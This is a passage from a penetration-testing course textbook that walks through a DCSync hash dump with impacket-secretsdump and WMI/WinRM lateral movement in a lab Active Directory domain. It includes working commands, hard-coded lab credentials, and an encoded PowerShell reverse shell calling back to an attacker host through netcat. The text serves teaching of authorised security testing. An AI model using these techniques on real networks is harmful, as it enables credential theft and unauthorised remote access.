the Module Lateral Movement in Active Directory.
For now, let’s perform the dcsync attack from Linux as well. We’ll use impacket-secretsdump to
acheive this. To launch it, we’ll enter the target username dave as an argument for -just-dc-user
and provide the credentials of a user with the required rights, as well as the IP of the domain
controller in the format __domain/user:password@ip__.
kali@kali:~$ impacket-secretsdump -just-dc-user dave
corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-
96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
Listing 824 - Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 775
Made in Morocco
Penetration Testing with Kali Linux
Listing 824 shows that we successfully obtained the NTLM hash of dave. The output of the tool
states that it uses DRSUAPI,1130 the Microsoft API implementing the Directory Replication Service
Remote Protocol.
The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we
can use it from both Windows and Linux. By impersonating a domain controller, we can use
replication to obtain user credentials from a domain controller. However, to perform this attack,
we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators,
because there are certain rights required to start the replication. Alternatively, we can leverage a
user with these rights assigned, though we’re far less likely to encounter one of these in a real
penetration test.
22.3 Wrapping Up
y
In this Module, we explored NTLM and Kerberos authentication. These authentication methods
are crucial for penetration testers to understand in order to perform penetration tests in AD
environments. Without grasping the concepts of how authenktication works, it is not possible to
understand how the attacks shown in this Module work on a technical level. To perform them in
real assessments, we often have to adapt these techniquses to be effective.
The attack methods from this Module provide us with the necessary skills to perform attacks on
AD authentication. These techniques will help uso tremendously to obtain valid user credentials
and access to systems and services.
n
In the next Module Lateral Movement in Active Directory, we’ll build on the knowledge and skills
provided in this Module to move laterally in an AD environment.
i
z
D
1130 (Samba Wiki, 2015), https://wiki.samba.org/index.php/DRSUAPI
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 776
Made in Morocco
Penetration Testing with Kali Linux
23 Lateral Movement in Active Directory
In this Learning Module, we will cover the following Learning Units:
• Active Directory Lateral Movement Techniques
• Active Directory Persistence
In previous Modules, we located high-value targets that could lead to an Active Directory
compromise and found the workstations or servers they are logged in to. We gathered password
hashes then recovered and leveraged existing tickets for Kerberos authentication.
Next, we will use lateral movement to compromise the machines these high-value domain users
are logged in to.
y
A logical next step in our approach would be to crack any password hashes we have obtained
and authenticate to a machine with clear text passwords to gkain unauthorized access. However,
password cracking takes time and may fail. In addition, Kerberos and NTLM do not use the clear
text password directly and native tools from Microsoft do not support authentication using the
s
password hash.
In this Module, we will explore different lateral movoement techniques that allow us to authenticate
to a system and gain code execution using a user’s hash or a Kerberos ticket.
n
23.1 Active Directory Lateral Movement Techniques
This Learning Unit covers the followiing Learning Objectives:
z
• Understand WMI, WinRS, and WinRM lateral movement techniques
• Abuse PsExec for laterDal movement
• Learn about Pass The Hash and Overpass The Hash as lateral movement techniques
• Misuse DCOM to move laterally
Lateral Movement is a tactic consisting of various techniques aimed to gain further access within
the target network. As described in the MITRE Framework,1131 these techniques may use the
current valid account or reuse authentication material such as password hashes, Kerberos
tickets, and application access tokens obtained from the previous attack stages.
In this Learning Unit, we are going to explore various techniques that involve both valid accounts
and previously retrieved credentials.
We should also remind ourselves that what we’ve learned about enumerating Active Directory
domains will still be relevant in the lateral movement attack phase as we might have gained
access to previously undiscovered networks.
1131 (MITRE, 2022), https://attack.mitre.org/tactics/TA0008/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 777
Made in Morocco
Penetration Testing with Kali Linux
23.1.1 WMI and WinRM
The first lateral movement technique we are going to cover is based on the Windows
Management Instrumentation (WMI),1132 which is an object-oriented feature that facilitates task
automation.
WMI is capable of creating processes via the Create method from the Win32_Process class. It
communicates through Remote Procedure Calls (RPC)1133 over port 135 for remote access and
uses a higher-range port (19152-65535) for session data.
To demonstrate this attack technique, we’ll first briefly showcase the wmic utility, which has been
recently deprecated,1134 and then we’ll discover how to conduct the same WMI attack via
PowerShell.
In order to create a process on the remote target via WMI, we need credentials of a member of
y
the Administrators local group, which can also be a domain user. In the following examples, we
are going to perform the attacks as the user jen, which is both a domain user and a member of
k
the Local Administrator group for the target machines.
We already encountered UAC remote restrictions1135 sfor non-domain joined machines in the
Password Attacks Module. However this kind of restriction does not apply to domain users,
meaning that we can leverage full privileges while moving laterally with the techniques shown in
o
this Learning Unit.
Historically, wmic has been abused for lateral movement via the command line by specifying the
n
target IP after the /node: argument then user and password after the /user: and /password:
keywords, respectively. We’ll also instruct wmic to launch a calculator instance with the process
call create keywords. We can test thie command by connecting as jeff on CLIENT74.
z
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call
create "calc"
D
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
ProcessId = 752;
ReturnValue = 0;
};
Listing 825 - Running the wmic utility to spawn a process on a remote system.
The WMI job returned the PID of the newly created process and a return value of “0”, meaning that
the process has been created successfully.
1132 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page
1133 (Microsoft, 2022), https://technet.microsoft.com/en-us/library/cc738291(v=ws.10).aspx
1134 (Microsoft, 2022), https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features
1135 (Microsoft, 2022), https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-
remote-restriction#domain-user-accounts-active-directory-user-account
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 778
Made in Morocco
Penetration Testing with Kali Linux
System processes and services always run in session 01136 as part of session
isolation, which was introduced in Windows Vista. Because the WMI Provider
Host is running as a system service, newly created processes through WMI are
also spawned in session 0.
Translating this attack into PowerShell syntax requires a few extra details. We need to create a
PSCredential1137 object that will store our session username and password. To do that, we will
first store the username and password in the respective variables and then secure the password
via the ConvertTo-SecureString cmdlet. Finally, we’ll create a new PSCredential object with the
given username and secureString object.
y
$username = 'jen';
$password = 'Nexus123!';
k
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,
$secureString; s
Listing 826 - Creating the PSCredential object in PowerShell
Next, we want to create a Common Information Moodel (CIM) via the _New-CimSession1138 cmdlet.
We’ll first specify DCOM as the protocol for the WMI session with the New-CimSessionOption
cmdlet on the first line. On the second line, we’ll create the new session against our target IP and
n
supply the PSCredential object along with the session options. Lastly, we’ll define ‘calc’ as the
payload to be executed by WMI.
i
$options = New-CimSessionOption -Protocol DCOM
z
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -
SessionOption $Options
$command = 'calc'; D
Listing 827 - Creating a new CimSession
As a final step, we need to tie together all the arguments we configured previously by issuing the
Invoke-CimMethod cmdlet and supplying Win32_Process and Create as ClassName and
MethodName, respectively.
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -
Arguments @{CommandLine =$Command};
Listing 828 - Invoking the WMI session through PowerShell
To simulate the technique, we can connect to CLIENT74 as jeff and insert the above code in a
PowerShell prompt.
PS C:\Users\jeff> $username = 'jen';
...
1136 (Microsoft, 2022), https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-
isolation/ba-p/372361
1137 (Microsoft, 2022), https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-
functions?view=powershell-7.2
1138 (Microsoft, 2022), https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 779
Made in Morocco
Penetration Testing with Kali Linux
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -
MethodName Create -Arguments @{CommandLine =$Command};
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
3712 0 192.168.50.73
Listing 829 - Executing the WMI PowerShell payload.
Verifying the active processes on the target machine reveals that a new calculator process has
been launched, confirming that our attack has succeeded.
y
k
s
o
n
i
z
D
Figure 284: Inspecting The Task Manager
To further improve our craft, we could replace the previous payload with a full reverse shell
written in PowerShell.
First, we’ll encode the PowerShell reverse shell so we don’t need to escape any special characters
when inserting it as a WMI payload.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 780
Made in Morocco
Penetration Testing with Kali Linux
The following Python code encodes the PowerShell reverse shell to base64 contained in the
payload variable and then prints the result to standard output.
As reviewing the entire PowerShell payload is outside the scope of this Module, we should replace
the highlighted IP and port with the ones of our attacker Kali machine.
import sys
import base64
payload = '$client = New-Object
System.Net.Sockets.TCPClient("192.168.118.2",443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){;$data = (New-Object -TypeName
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte =
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($ysendbyte,0,$sendbyte.Leng
th);$stream.Flush()};$client.Close()'
k
cmd = "powershell -nop -w hidden -e " +
base64.b64encode(payload.encode('utf16')[2:]).decode()
s
print(cmd)
Listing 830 - Executing the WMI PowerShell payload.
o
Once we have saved the Python script, we can run it and retrieve the output to use later.
kali@kali:~$ python3 encode.py n
powershell -nop -w hidden -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
i
MAbwBjAGsAZQB0AHMALgBUAEMAU...
OwAkAHMAdAByAGUAYQBtAC4ARgBsAHzUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoAC
kA
Listing 831 - Running the base64 encoder Python script
D
After setting up a Netcat listener on port 443 on our Kali machine, we can move on to client74
and run the PowerShell WMI script with the newly generated encoded reverse-shell payload.
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -
Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential
$username, $secureString;
PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential
$credential -SessionOption $Options
PS C:\Users\jeff> $Command = 'powershell -nop -w hidden -e
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -
MethodName Create -Arguments @{CommandLine =$Command};
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 781
Made in Morocco
Penetration Testing with Kali Linux
ProcessId ReturnValue PSComputerName
--------- ----------- --------------
3948 0 192.168.50.73
Listing 832 - Executing the WMI payload with base64 reverse shell
From the output in Listing 832, we can conclude that the process creation has been successful
and switch to our listener for a final confirmation.
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 49855
PS
C:\windows\system32\driverstore\filerepository\ntprint.inf_amd64_075615bee6f80a8d\amd6
4> hostname
FILES04 y
PS
C:\windows\system32\driverstore\filerepository\ntprint.iknf_amd64_075615bee6f80a8d\amd6
4> whoami
corp\jen
s
Listing 833 - Executing the WMI payload with base64 reverse shell
Nice! We indeed managed to move laterally ando gain privileges as the jen domain user on an
internal server by abusing WMI features.
As an alternative method to WMI for remonte management, WinRM can be employed for remote
hosts management. WinRM is the Microsoft version of the WS-Management1139 protocol and it
exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS
i
traffic and port 5986 for plain HTTP.
z
In addition to its PowerShell implementation, which we’ll cover later in this section, WinRM is
implemented in numerous bDuilt-in utilities, such as winrs1140 (Windows Remote Shell).
The winrs utility can be invoked by specifying the target host through the -r: argument and the
username and password with -u: and -p, respectively. As a final argument, we want to specify the
commands to be executed on the remote host. For example, we want to run the hostname and
whoami commands to prove that they are running on the remote target.
Since winrs only works for domain users, we’ll execute the whole command once we’ve logged in
as jeff on CLIENT74 and provide jen’s credentials as command arguments.
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
FILES04